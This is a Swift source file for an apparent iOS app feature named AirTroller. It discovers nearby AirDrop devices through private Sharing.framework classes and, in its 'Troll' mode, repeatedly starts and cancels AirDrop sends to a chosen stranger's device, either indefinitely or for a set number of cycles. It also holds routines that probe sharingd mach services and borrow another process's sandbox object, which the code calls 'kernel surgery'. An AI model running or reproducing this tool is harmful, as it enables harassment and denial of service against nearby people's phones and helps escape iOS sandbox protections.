//
//  AirTrollerManager.swift
//  lara
//
//  State machine for the AirTroller feature: AirDrop discovery (SFAirDropBrowser)
//  plus the start → cancel loop on SFAirDropNode.
//
//  Threading: the browser snapshot, the payload write and the whole send/cancel
//  loop run on lara.airtroller (a background queue) or on the browser's own
//  callback queue. Only @Published state is touched on the main queue.
//
//  See docs/dev/airtroller-integration.md for the reverse engineering notes.
//

import Foundation
import UIKit
import CoreGraphics
import Combine

/// Stop signal shared between the main queue (writes) and the worker (reads).
private let airtrollerlock = NSLock()
private nonisolated(unsafe) var airtrollerstoprequested = false

private nonisolated func airtrollersignalstop() {
    airtrollerlock.lock()
    airtrollerstoprequested = true
    airtrollerlock.unlock()
}

private nonisolated func airtrollerclearsignal() {
    airtrollerlock.lock()
    airtrollerstoprequested = false
    airtrollerlock.unlock()
}

private nonisolated func airtrollershouldstop() -> Bool {
    airtrollerlock.lock()
    defer { airtrollerlock.unlock() }
    return airtrollerstoprequested
}

/// Sleeps in small slices so a stop is honoured within ~20ms.
/// Returns false as soon as a stop was requested.
private nonisolated func airtrollersleep(_ milliseconds: Double) -> Bool {
    let target = Date(timeIntervalSinceNow: max(0.0, milliseconds) / 1000.0)
    while true {
        if airtrollershouldstop() {
            return false
        }
        let remaining = target.timeIntervalSinceNow
        if remaining <= 0 {
            return true
        }
        usleep(UInt32(min(20.0, remaining * 1000.0) * 1000.0))
    }
}

/// Delay used when the trigger is switched to "Event": live SFOperation events
/// cannot be received on device yet (documented), so a fixed delay stands in.
private let airtrollerfallbacktriggerdelay: Double = 400

struct AirTrollerTarget: Identifiable, Equatable {
    let id: String
    let name: String
    let realname: String
    let isdisabled: Bool
    let isme: Bool
    let model: String
    let handles: String

    var subtitle: String {
        var parts: [String] = []
        if isme { parts.append("this device") }
        if isdisabled { parts.append("unavailable") }
        if !model.isEmpty { parts.append(model) }
        if parts.isEmpty, !realname.isEmpty { parts.append(realname) }
        if parts.isEmpty, !handles.isEmpty { parts.append(handles) }
        return parts.joined(separator: " · ")
    }
}

struct AirTrollerEvent: Identifiable, Equatable {
    let id = UUID()
    let stamp: String
    let text: String
}

/// Plain-data everything the worker needs; built on the main queue, read on the
/// worker queue (no SwiftUI / actor isolated values in here).
struct AirTrollerRunConfig {
    let node: NSObject
    let name: String
    let items: [URL]
    let bundleID: String
    let sessionID: String
    let issurvey: Bool
    let triggerisevent: Bool
    let triggerdelayms: Double
    let gapms: Double
    let maxcycles: Int
    let fromsharesheet: Bool
    let previewimage: CGImage?
    let replaysyntheticevents: Bool
}

final class AirTrollerManager: ObservableObject {

    /// Shared instance so SwiftUI view churn (inline NavigationLink destinations
    /// are recreated when the parent List re-renders) cannot tear down the
    /// AirDrop browser mid-discovery.
    static let shared = AirTrollerManager()

    enum Mode: String, CaseIterable, Identifiable {
        case survey = "Survey"
        case troll = "Troll"

        var id: String { rawValue }

        var summary: String {
            switch self {
            case .survey:
                return "one send, then dump the SFAirDropNode event machine"
            case .troll:
                return "send → wait trigger → cancel → gap → repeat"
            }
        }
    }

    enum TriggerKind: String, CaseIterable, Identifiable {
        case delay = "Delay"
        case event = "Event"

        var id: String { rawValue }
    }

    // MARK: published state

    @Published var events: [AirTrollerEvent] = []
    @Published var targets: [AirTrollerTarget] = []
    @Published var issupported = false
    @Published var isscanning = false
    @Published var isrunning = false
    @Published var mode: Mode = .troll
    @Published var triggerkind: TriggerKind = .delay
    @Published var triggerdelayms: Double = 350
    @Published var triggerevent: Double = 5 {
        didSet { triggerevent = min(max(triggerevent, 0), 16) }
    }
    @Published var gapms: Double = 500
    @Published var maxcycles: Double = 0
    @Published var fromsharesheet = false
    @Published var attachpreviewimage = false
    @Published var replaysyntheticevents = true
    @Published var selectedtargetid: String?
    @Published var cyclecount = 0
    @Published var sessionid: String
    @Published var payloadpath: String = "(not created yet)"
    @Published var status: String = "idle"

    // MARK: private

    private let workqueue = DispatchQueue(label: "lara.airtroller", qos: .userInitiated)
    private nonisolated(unsafe) var scanitem: DispatchWorkItem?
    private var nodesbyid: [String: NSObject] = [:]
    private var loggedemptydiag = false

    private static let stampformatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateFormat = "HH:mm:ss.SSS"
        return formatter
    }()

    init() {
        sessionid = UUID().uuidString
        issupported = AirTrollerBridge.isSupported()
        AirTrollerManager.active = self
        if issupported {
            appendlog("Sharing.framework AirDrop classes present, AirTroller ready")
        } else {
            appendlog("SFAirDropBrowser / SFAirDropNode not found, feature disabled on this build")
        }
    }

    // MARK: derived

    var selectedtarget: AirTrollerTarget? {
        targets.first { $0.id == selectedtargetid }
    }

    var eventlabels: [String] {
        (0...16).map { event in
            "\(event) \(AirTrollerBridge.name(forOperationEvent: event))"
        }
    }

    var triggerdelayvalue: Double {
        triggerkind == .delay ? triggerdelayms : airtrollerfallbacktriggerdelay
    }

    // MARK: logging

    func appendlog(_ text: String) {
        let line = AirTrollerEvent(stamp: AirTrollerManager.stampformatter.string(from: Date()),
                                   text: text)
        events.append(line)
        if events.count > 400 {
            events.removeFirst(events.count - 400)
        }
        laramgr.shared.logmsg("(airtroller) \(text)")
    }

    // MARK: discovery

    func startscan() {
        if isscanning {
            return
        }
        if isrunning {
            appendlog("cannot browse while a run is in progress")
            return
        }
        guard issupported else {
            status = "unsupported"
            appendlog("browse aborted: SFAirDropBrowser unavailable")
            return
        }

        let bundleid = Bundle.main.bundleIdentifier ?? "com.roooot.lara"
        let sessionid = self.sessionid
        let payload = AirTrollerBridge.preparePayloadFile()

        isscanning = true
        status = "browsing"
        loggedemptydiag = false
        appendlog("browse: start SFAirDropBrowser (bundleID=\(bundleid), sessionID=\(sessionid), urls=\(payload != nil ? "1" : "0"))")

        workqueue.async {
            let bridge = AirTrollerBridge.shared
            let ok = bridge.startDiscovery(withBundleID: bundleid, sessionID: sessionid, urlsBeingShared: payload.map { [$0] })
            let failure = ok ? "" : (bridge.lastError ?? "")
            let probe = AirTrollerBridge.probeSharingdReachability()
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                if ok {
                    self.payloadpath = payload?.path ?? "(payload failed)"
                    self.appendlog("browse: browser started")
                    self.appendlog("browse: sharingd reachability: \(probe)")
                } else {
                    self.isscanning = false
                    self.status = "browse failed"
                    self.appendlog("browse: \(failure)")
                }
            }
        }

        let item = DispatchWorkItem { [weak self] in
            self?.polltargets()
        }
        scanitem = item
        AirTrollerBridge.shared.onDiscoveryChanged = { [weak self] in
            self?.polltargets()
        }
        workqueue.async(execute: item)
    }

    func stopscan() {
        guard isscanning else { return }
        AirTrollerBridge.shared.onDiscoveryChanged = nil
        scanitem?.cancel()
        scanitem = nil
        isscanning = false
        targets = []
        nodesbyid = [:]
        selectedtargetid = nil
        status = "browsing stopped"
        appendlog("browse: stopped, cached targets cleared")

        let bridge = AirTrollerBridge.shared
        workqueue.async {
            bridge.stopDiscovery()
        }
    }

    // MARK: diagnostics

    func diagnose() {
        appendlog("diag: probing mach services...")
        workqueue.async {
            // Mach probes first, so they are on the log before anything riskier.
            let services = AirTrollerBridge.diagnoseSharingd()
            DispatchQueue.main.async { [weak self] in
                self?.appendlog("diag: mach services ->\(services)")
            }

            let sandbox = AirTrollerBridge.dumpSandbox()
            DispatchQueue.main.async { [weak self] in
                self?.appendlog("diag: \(sandbox)")
            }
        }
    }

    /// Borrows another process's sandbox object. Kernel surgery: only advances
    /// when the name actually resolves to a running pid.
    func adoptfrom(name: String) {
        let pid = AirTrollerBridge.pid(ofProcess: name)
        guard pid != 0 else {
            appendlog("adopt: no running process named \(name)")
            return
        }
        appendlog("adopt: borrowing the sandbox object of \(name) (pid \(pid))...")
        workqueue.async {
            let report = AirTrollerBridge.attemptSandboxAdoption(withPID: pid)
            DispatchQueue.main.async { [weak self] in
                self?.appendlog("adopt: \(report)")
            }
        }
    }

    private func schedulepoll(after seconds: Double) {
        guard isscanning else { return }
        DispatchQueue.main.asyncAfter(deadline: .now() + seconds) { [weak self] in
            guard let self = self, self.isscanning, let item = self.scanitem else { return }
            self.workqueue.async(execute: item)
        }
    }

    /// Runs off the main queue: reads the browser, never touches @Published state.
    nonisolated func polltargets() {
        let snapshot = AirTrollerBridge.shared.targetSnapshot()
        var dicts: [[String: Any]] = []
        for entry in snapshot {
            if let dict = entry as? [String: Any] {
                dicts.append(dict)
            }
        }
        if dicts.isEmpty {
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                if !self.targets.isEmpty {
                    self.targets = []
                    self.nodesbyid = [:]
                    self.selectedtargetid = nil
                    self.appendlog("browse: no discoverable nodes any more")
                }
                if !self.loggedemptydiag {
                    self.loggedemptydiag = true
                    self.appendlog("browse: still no nodes (framework delegate events \(AirTrollerBridge.shared.delegateEventCount), last people \(AirTrollerBridge.shared.lastPeopleCount))")
                }
                self.schedulepoll(after: 1.5)
            }
            return
        }

        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            var fresh: [AirTrollerTarget] = []
            var lookup: [String: NSObject] = [:]
            for dict in dicts {
                let id = dict["id"] as? String ?? UUID().uuidString
                fresh.append(AirTrollerTarget(id: id,
                                              name: dict["name"] as? String ?? "(unnamed)",
                                              realname: dict["realname"] as? String ?? "",
                                              isdisabled: (dict["disabled"] as? NSNumber)?.boolValue ?? false,
                                              isme: (dict["me"] as? NSNumber)?.boolValue ?? false,
                                              model: dict["model"] as? String ?? "",
                                              handles: dict["handles"] as? String ?? ""))
                if let node = dict["node"] as? NSObject {
                    lookup[id] = node
                }
            }

            let changed = (self.targets != fresh)
            self.targets = fresh
            self.nodesbyid = lookup
            if changed {
                self.appendlog("browse: \(fresh.count) discoverable node(s): \(fresh.map(\.name).joined(separator: ", "))")
            }
            if self.selectedtargetid == nil || !fresh.contains(where: { $0.id == self.selectedtargetid }) {
                self.selectedtargetid = fresh.first?.id
            }
            self.schedulepoll(after: 1.5)
        }
    }

    // MARK: run

    func start() {
        if isrunning {
            return
        }
        guard issupported else {
            appendlog("run aborted: SFAirDropNode unavailable")
            return
        }
        guard let target = selectedtarget else {
            appendlog("run aborted: pick a target first")
            return
        }
        guard let node = nodesbyid[target.id] else {
            appendlog("run aborted: target \(target.name) has no live node handle")
            return
        }
        guard let payload = AirTrollerBridge.preparePayloadFile() else {
            appendlog("run aborted: could not create the payload file")
            return
        }

        let config = AirTrollerRunConfig(node: node,
                                         name: target.name,
                                         items: [payload],
                                         bundleID: Bundle.main.bundleIdentifier ?? "com.roooot.lara",
                                         sessionID: sessionid,
                                         issurvey: (mode == .survey),
                                         triggerisevent: (triggerkind == .event),
                                         triggerdelayms: triggerdelayms,
                                         gapms: gapms,
                                         maxcycles: Int(maxcycles),
                                         fromsharesheet: fromsharesheet,
                                         previewimage: attachpreviewimage ? AirTrollerManager.makepreviewimage() : nil,
                                         replaysyntheticevents: replaysyntheticevents)

        isrunning = true
        cyclecount = 0
        status = (mode == .survey) ? "survey running" : "trolling"
        airtrollerclearsignal()
        appendlog("run: \(mode.rawValue) → \(target.name) [trigger \(triggerkind.rawValue) \(Int(triggerdelayvalue))ms, gap \(Int(gapms))ms, preview \(attachpreviewimage ? "on" : "off"), fromShareSheet \(fromsharesheet ? "YES" : "NO")]")
        payloadpath = payload.path

        workqueue.async {
            AirTrollerManager.runworker(config)
        }
    }

    func stop() {
        guard isrunning else { return }
        airtrollersignalstop()
        status = "stopping"
        appendlog("run: stop requested")
    }

    // MARK: worker (never on the main queue)

    private nonisolated static func runworker(_ config: AirTrollerRunConfig) {
        let bridge = AirTrollerBridge.shared

        // Every line hops to the main queue, where it is appended to the log.
        let log: (String) -> Void = { text in
            DispatchQueue.main.async {
                guard let manager = AirTrollerManager.active else { return }
                manager.appendlog(text)
            }
        }

        defer {
            DispatchQueue.main.async {
                guard let manager = AirTrollerManager.active else { return }
                manager.isrunning = false
                manager.status = "idle"
                manager.appendlog("run: finished after \(manager.cyclecount) cycle(s)")
            }
        }

        var cycle = 0
        while !airtrollershouldstop() {
            if config.issurvey && cycle > 0 {
                break
            }
            if config.maxcycles > 0 && cycle >= config.maxcycles {
                break
            }

            cycle += 1
            let started = Date()

            let ok = bridge.startSend(toNode: config.node,
                                      bundleID: config.bundleID,
                                      sessionID: config.sessionID,
                                      items: config.items,
                                      description: "AirTroller test payload",
                                      previewImage: config.previewimage,
                                      fromShareSheet: config.fromsharesheet)
            let failure = ok ? "" : (bridge.lastError ?? "")

            DispatchQueue.main.async {
                guard let manager = AirTrollerManager.active else { return }
                manager.cyclecount = cycle
                manager.status = "cycle \(cycle)"
            }

            if !ok {
                log("cycle \(cycle): startSendToNode failed, \(failure)")
                break
            }

            log("cycle \(cycle): startSendForBundleID:\(config.bundleID) sessionID:\(config.sessionID) items:\(config.items.count) (\(config.items.first?.path ?? "")) previewImage:\(config.previewimage != nil ? "cgimage" : "nil") fromShareSheet:\(config.fromsharesheet ? "YES" : "NO")")

            if !airtrollersleep(config.triggerisevent ? airtrollerfallbacktriggerdelay : config.triggerdelayms) {
                log("cycle \(cycle): stop requested inside the trigger window")
                break
            }

            bridge.cancelSend(toNode: config.node)
            let elapsed = Int(Date().timeIntervalSince(started) * 1000)
            log("cycle \(cycle): cancelSend on \(config.name) at +\(elapsed)ms")
            if config.triggerisevent {
                log("cycle \(cycle): live event trigger unreachable so far, used the \(Int(airtrollerfallbacktriggerdelay))ms delay instead")
            }

            if config.issurvey {
                if config.replaysyntheticevents {
                    surveyevents(config.node, log: log)
                }
                break
            }

            if config.maxcycles > 0 && cycle >= config.maxcycles {
                break
            }
            if !airtrollersleep(config.gapms) {
                log("cycle \(cycle): stop requested inside the gap")
                break
            }
        }
    }

    /// Replays the event numbers through -[SFAirDropNode handleOperationCallback:event:withResults:]
    /// so the event machine can be mapped without a live transfer.
    private nonisolated static func surveyevents(_ node: NSObject, log: @escaping (String) -> Void) {
        let events = AirTrollerBridge.safeReplayEvents()
        log("survey: replaying \(events.count) safe event numbers into handleOperationCallback:event:withResults:")
        for number in events {
            let value = number.intValue
            let name = AirTrollerBridge.name(forOperationEvent: value)
            AirTrollerBridge.shared.replayOperationEvent(value, withResults: nil, onNode: node)
            log("survey: event \(value) \"\(name)\" → \(actionforevent(value))")
        }
    }

    /// What -[SFAirDropNode handleOperationCallback:event:withResults:] does per event
    /// (decoded from Sharing @ 0x1a9068e18).
    nonisolated static func actionforevent(_ event: Int) -> String {
        switch event {
        case 2:  return "_SFOperationResume(op) i.e. answer the ask-user prompt"
        case 3:  return "no-op"
        case 4:  return "auto cancelSend (Cancelled)"
        case 9:  return "auto cancelSend (Finished)"
        case 10: return "auto cancelSend + \"Sender kSFOperationEventErrorOccured %@\""
        case 5, 6, 7, 8, 11, 14, 15: return "normal completion, no cancel"
        case 0, 1, 12, 13: return "\"Sender UNHANDLED EVENT %@ [%d] %@\", no action"
        default: return "log only (>= 16)"
        }
    }

    // MARK: helpers

    /// The live manager, so non isolated worker closures can reach the shared
    /// object without capturing a non-Sendable self.
    nonisolated(unsafe) private static var active: AirTrollerManager?

    static func makepreviewimage() -> CGImage? {
        let size = CGSize(width: 120, height: 120)
        let renderer = UIGraphicsImageRenderer(size: size)
        let image = renderer.image { context in
            UIColor.systemTeal.setFill()
            UIBezierPath(roundedRect: CGRect(origin: .zero, size: size), cornerRadius: 24).fill()
            let attributes: [NSAttributedString.Key: Any] = [
                .font: UIFont.boldSystemFont(ofSize: 64),
                .foregroundColor: UIColor.white
            ]
            let label = "AT" as NSString
            let labelsize = label.size(withAttributes: attributes)
            label.draw(at: CGPoint(x: (size.width - labelsize.width) / 2.0,
                                   y: (size.height - labelsize.height) / 2.0),
                       withAttributes: attributes)
            _ = context
        }
        return image.cgImage
    }
}
